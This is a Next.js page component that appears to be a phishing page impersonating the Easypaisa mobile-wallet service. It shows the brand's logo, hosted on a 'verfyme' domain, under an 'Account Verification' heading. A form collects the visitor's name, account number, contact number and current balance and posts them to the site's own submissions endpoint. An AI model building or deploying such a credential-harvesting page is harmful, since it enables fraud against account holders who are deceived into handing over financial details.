'use client';

import React, { useState } from 'react';
import Image from 'next/image';
import SplashScreen from './components/SplashScreen';
import DatabaseStatus from './components/DatabaseStatus';

export default function Home() {
  const [showSplash, setShowSplash] = useState(true);
  const [showForm, setShowForm] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    accountNumber: '',
    contactNumber: '',
    currentBalance: ''
  });
  const [submittedData, setSubmittedData] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);

  const handleSplashFinish = () => {
    setShowSplash(false);
    setShowForm(true);
  };

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    
    try {
      const response = await fetch('/api/submissions', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });
      
      const result = await response.json();
      
      if (result.success) {
        setSubmittedData(result.data);
        // Reset form
        setFormData({
          name: '',
          accountNumber: '',
          contactNumber: '',
          currentBalance: ''
        });
      } else {
        setError(result.message || 'Failed to submit form');
      }
    } catch (err) {
      setError('Network error. Please try again.');
      console.error('Submission error:', err);
    } finally {
      setLoading(false);
    }
  };

  if (showSplash) {
    return (
      <>
        <DatabaseStatus />
        <SplashScreen onFinish={handleSplashFinish} />
      </>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <DatabaseStatus />
      
      {/* Header */}
      <header className="bg-white shadow-sm">
        <div className="container mx-auto px-4 py-4">
          <Image
            src="https://verfyme.vercel.app/images/easypaisa-black-logo.png"
            alt="Easypaisa Logo"
            width={150}
            height={50}
          />
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        {submittedData ? (
          <div className="bg-white rounded-lg shadow-md p-6 max-w-2xl mx-auto">
            <h2 className="text-2xl font-bold text-green-600 mb-4">Your form submitted successfully</h2>
            <div className="space-y-2">
              <p><span className="font-semibold">Name:</span> {submittedData.name}</p>
              <p><span className="font-semibold">Account Number:</span> {submittedData.accountNumber}</p>
              <p><span className="font-semibold">Contact Number:</span> {submittedData.contactNumber}</p>
              <p><span className="font-semibold">Current Balance:</span> {submittedData.currentBalance}</p>
            </div>
            
          </div>
        ) : showForm && (
          <div className="bg-white rounded-lg shadow-md p-6 max-w-2xl mx-auto">
            <h1 className="text-2xl font-bold text-gray-800 mb-6">Account Verification</h1>
            <p className="text-2xl font-bold text-gray-800 mb-2">Please provide your account details for verification</p>
            
            {error && (
              <div className="bg-red-50 text-red-700 p-3 rounded-md mb-4">
                {error}
              </div>
            )}
            
            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <label htmlFor="name" className="block text-sm font-medium text-gray-700 mb-1">
                  Name
                </label>
                <input
                  type="text"
                  id="name"
                  name="name"
                  value={formData.name}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                  required
                />
              </div>

              <div>
                <label htmlFor="accountNumber" className="block text-sm font-medium text-gray-700 mb-1">
                  Account Number
                </label>
                <input
                  type="text"
                  id="accountNumber"
                  name="accountNumber"
                  value={formData.accountNumber}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                  required
                />
              </div>

              <div>
                <label htmlFor="contactNumber" className="block text-sm font-medium text-gray-700 mb-1">
                  Contact Number
                </label>
                <input
                  type="tel"
                  id="contactNumber"
                  name="contactNumber"
                  value={formData.contactNumber}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                  required
                />
              </div>

              <div>
                <label htmlFor="currentBalance" className="block text-sm font-medium text-gray-700 mb-1">
                  Current Balance
                </label>
                <input
                  type="number"
                  id="currentBalance"
                  name="currentBalance"
                  value={formData.currentBalance}
                  onChange={handleInputChange}
                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                  required
                />
              </div>

              <button
                type="submit"
                disabled={loading}
                className={`w-full bg-[#016630] text-white py-2 px-4 rounded-md  ${loading ? 'opacity-50 cursor-not-allowed' : ''}`}
              >
                {loading ? 'Submitting...' : 'Next'}
              </button>
            </form>
          </div>
        )}
      </main>
    </div>
  );
}